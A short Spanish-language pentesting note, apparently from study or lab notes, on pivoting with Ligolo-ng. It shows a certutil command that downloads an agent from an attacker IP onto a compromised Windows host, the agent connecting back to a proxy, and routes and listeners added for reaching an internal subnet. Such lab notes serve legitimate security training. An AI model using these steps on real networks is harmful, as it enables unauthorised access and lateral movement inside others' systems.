![image](Imágenes/20240214095829.png)


### Ligolo

- https://github.com/nicocha30/ligolo-ng

##### set up iface

```sh
sudo ip tuntap add user kali mode tun ligolo
```

```sh
sudo ip link set ligolo up
```
##### transferir binario a máquina comprometida

```sh
# desde la máquina atacante
# windows
certutil.exe -urlcache -f http://<ip atacante>:1234/agent.exe agent.exe
```

##### ejecutar el binario

```sh
agent.exe -connect 10.0.2.5:11601 -ignore-cert
```

##### iniciar el proxy

```sh
./proxy -selfcert
```
![image](Imágenes/20240214101306.png)
##### añadir la ruta ip a la máquina atacante

```sh
sudo ip route add 10.10.10.0/24 dev ligolo
```

##### añadir otro listener al server Python

```sh
listener_add - addr 0.0.0.0:1235 - to 127.0.0.1:8888
```

- podremos listar las direcciones con `listener_list`
![image](Imágenes/20240214101545.png)


- ahora hay que acordarse de añadir la ip de la máquina pivote y puerto seteado en ligolo

![image](Imágenes/20240214101920.png)




